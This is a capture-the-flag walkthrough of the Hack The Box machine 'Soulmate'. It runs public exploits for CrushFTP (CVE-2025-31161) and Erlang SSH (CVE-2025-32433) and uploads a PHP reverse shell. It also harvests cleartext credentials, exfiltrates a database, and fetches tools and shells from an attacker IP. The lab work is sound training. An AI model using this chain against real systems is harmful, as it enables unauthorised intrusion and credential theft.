# Soulmate - Easy

```sh
sudo vim /etc/hosts
# add soulmate.htb

nmap -T4 -p- -A -Pn -v soulmate.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
    * 80/tcp - http - nginx 1.18.0

* the webpage gives us the endpoints for registering and logging into an account

* web scan:

    ```sh
    gobuster dir -u http://soulmate.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # dir scan

    ffuf -c -u "http://soulmate.htb" -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 154 -s
    # subdomain scan
    ```

* create an account at /register.php - after this we can login at /login.php

* after logging in, we can check our profile at /profile.php - where we can edit our info and update our profile picture

* ```gobuster``` finds a page /dashboard.php - but when we try to access this, it redirects us to /profile - which does not exist

* the subdomain scan gives us a domain 'ftp.soulmate.htb' - update ```/etc/hosts``` with this entry

* this page leads us to 'http://ftp.soulmate.htb/WebInterface/login.html', titled CrushFTP WebInterface, and is a login page

* trying common creds like 'admin:admin' does not work; however, trying different usernames like 'crushadmin' (default username) or 'test' gives a different error - this means 'admin' could be a valid username

* Googling for 'crushftp' and any possible vulnerabilities shows that there are a few recent exploits like CVE-2025-31161 (previously CVE-2025-2825) and CVE-2025-54309

* testing for [CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161) first, this is an auth bypass exploit and it needs an existing valid username:

    ```sh
    python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user admin --new_user test --password password
    # this works
    ```

* after running the exploit, we have valid creds using which we can log into CrushFTP

* the interface shows that there are no files available

* clicking on the admin option leads us to 'http://ftp.soulmate.htb/WebInterface/admin/index.html' - this gives some info on servers and users - but nothing interesting

* we can activate the server log, and check the updated logs at 'http://ftp.soulmate.htb/WebInterface/admin/log.html' - this gives us a few usernames like 'jenna', 'ben', 'testadmin', 'crushadmin' & 'default', but no passwords or cleartext credentials

* this same info can be obtained if we navigate to the User Manager option at 'http://ftp.soulmate.htb/WebInterface/UserManager/index.html'

* attempting the other exploit CVE-2025-54309 does not work so we need to use the CrushFTP authenticated access to get RCE

* checking each user mentioned in the User Manager interface, we can see user files in the FTP server; users 'ben' and 'jenna' have some folders, but 'ben' has a folder named 'webProd' which includes the info for the webfiles

* the 'webProd' folder can be used to upload a PHP revshell file to get RCE, but we do not have access to it as the current 'test' user

* the User Manager interface also offers an option to modify user settings, and this includes user password - we can use this to modify password of 'ben'

* now we can log into CrushFTP as 'ben' - the homepage shows the folders view; we can go into 'webProd' and upload a PHP reverse shell file into the web directory

* setup listener and navigate to uploaded revshell at 'http://soulmate.htb/reverse-shell.php':

    ```sh
    nc -nvlp 4444

    # we get reverse shell

    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z to bg shell
    stty raw -echo; fg
    # press Enter twice

    ls -la /
    ```

* enumerate for config files, cleartext creds or any other tool for privesc as standard user:

    ```sh
    ls -la /home
    # we have user 'ben'

    ls -la /home/ben/
    # no read access to subdirectories

    ls -la /opt
    
    ls -la /opt/crushftp
    # permission denied

    ls -la /var/www
    # enumerate web files

    ls -la /var/www/soulmate.htb/

    cat /var/www/soulmate.htb/config/config.php
    # this gives cleartext creds for 'admin' user

    ls -la /var/www/soulmate.htb/data/soulmate.db
    # we have a DB file

    md5sum /var/www/soulmate.htb/data/soulmate.db

    cat /var/www/soulmate.htb/data/soulmate.db | base64 -w 0; echo
    # copy the base64-encoded file
    ```

    ```sh
    # on attacker
    echo -n "<base64-encoded-text>" | base64 -d > soulmate.db
    # paste base64 content

    md5sum soulmate.db
    # verify file is copied correctly

    sqlitebrowser soulmate.db
    ```

* the config file gives us the cleartext password 'Crush4dmin990'; the DB file includes the hash for 'admin' user - this could be the cleartext we found earlier

* we can attempt to reuse the creds for 'ben' via SSH - but this does not work

* we can enumerate further using ```linpeas```:

    ```sh
    cd /tmp

    wget http://10.10.14.23:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * network interfaces have connectivity to 172.<17/18/19>.0.1 subnets
    * list of active ports shows some internal services

* checking the internal ports/services:

    ```sh
    ss -ltnp
    ```

* the list of open ports include common web ports and SSH-related ports - these do not lead to any hints; it also mentions port 4369

* Googling about port 4369 shows that it is used by empd (Erlang port mapper daemon), usually used in Erlang nodes & RabbitMQ brokers

* checking for config related to Erlang does not give anything

* continuing manual enumeration, we can check for any background processes via ```pspy```:

    ```sh
    wget http://10.10.14.23:8000/pspy64

    chmod +x pspy64

    ./pspy64
    ```

* besides a few scripts in /root, ```pspy``` shows a non-default process:

    ```sh
    /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
    ```

* this is referring to an Erlang script at ```/usr/local/lib/erlang_login/start.escript``` that's running in the background in a non-interactive setup and starts a node 'ssh_runner'

* checking the script further:

    ```sh
    ls -la /usr/local/lib/erlang_login/start.escript
    # we have read access
    
    cat /usr/local/lib/erlang_login/start.escript
    ```

* the Erlang script launches a SSH daemon on port 2222 listening internally and allows SSH logins

* the script also includes plaintext creds 'ben:HouseH0ldings998' - we can use this to login as 'ben':

    ```sh
    ssh ben@soulmate.htb
    # this works

    cat user.txt
    # user flag

    sudo -l
    # not available
    ```

* as hinted by the script found, we can check on port 2222 further:

    ```sh
    nc 127.0.0.1 2222
    ```

* this provides the SSH banner with the version info ```SSH-2.0-Erlang/5.2.9```

* Googling for Erlang 5.2.9 and related CVEs/exploits leads us to [CVE-2025-32433](https://github.com/omer-efe-curkus/CVE-2025-32433-Erlang-OTP-SSH-RCE-PoC)

* to run the exploit, we need to setup local port forwarding first:

    ```sh
    ssh -L 1234:localhost:2222 ben@soulmate.htb
    ```

* now we can access the SSH daemon on attacker port 1234 for the exploit:

    ```sh
    # on attacker

    nc -nvlp 5555
    # setup listener

    python3 cve-2025-32433.py 127.0.0.1 -p 1234 --check
    # check vuln

    python3 cve-2025-32433.py 127.0.0.1 -p 1234 --shell --lhost 10.10.14.23 --lport 5555
    # exploit works, and we get reverse shell
    ```

    ```sh
    # in reverse shell

    id
    # root

    cat /root/root.txt
    # root flag
    ```
